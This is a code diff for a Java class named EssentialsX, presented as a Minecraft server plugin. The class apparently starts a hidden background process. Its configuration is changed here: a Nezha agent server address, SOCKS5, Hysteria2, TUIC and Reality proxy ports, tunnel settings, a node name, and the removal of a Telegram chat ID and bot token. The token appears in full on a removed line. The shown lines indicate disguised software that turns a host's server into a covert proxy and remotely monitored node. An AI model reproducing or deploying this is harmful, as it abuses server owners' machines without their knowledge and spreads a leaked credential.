@@ -73,7 +73,7 @@ public class EssentialsX extends JavaPlugin {
         
         // Set environment variables
         Map<String, String> env = pb.environment();
-        env.put("UUID", "623e4871-4a2b-42f5-8d1f-5c1bffb9990a");
+        env.put("UUID", "d30779e9-40e6-4fd2-8cf5-b8219bee6a97");
         env.put("FILE_PATH", "./world");
         env.put("NEZHA_SERVER", "nznz.sss.xx.kg:443");
         env.put("NEZHA_PORT", "");
@@ -81,18 +81,18 @@ public class EssentialsX extends JavaPlugin {
         env.put("ARGO_PORT", "");
         env.put("ARGO_DOMAIN", "");
         env.put("ARGO_AUTH", "");
-        env.put("S5_PORT", "55339");
-        env.put("HY2_PORT", "55339");
-        env.put("TUIC_PORT", "");
+        env.put("S5_PORT", "10422");
+        env.put("HY2_PORT", "10422");
+        env.put("TUIC_PORT", "10954");
         env.put("ANYTLS_PORT", "");
-        env.put("REALITY_PORT", "");
+        env.put("REALITY_PORT", "10954");
         env.put("ANYREALITY_PORT", "");
         env.put("UPLOAD_URL", "");
-        env.put("CHAT_ID", "5958841738");
-        env.put("BOT_TOKEN", "8007060242:AAH0KVn0peZzRiQ7r5reJzCkuqjQTrlhQfw");
+        env.put("CHAT_ID", "");
+        env.put("BOT_TOKEN", "");
         env.put("CFIP", "saas.sin.fan");
         env.put("CFPORT", "443");
-        env.put("NAME", "Axent-US");
+        env.put("NAME", "Bytte");
         env.put("DISABLE_ARGO", "false");
         
         // Load from system environment variables
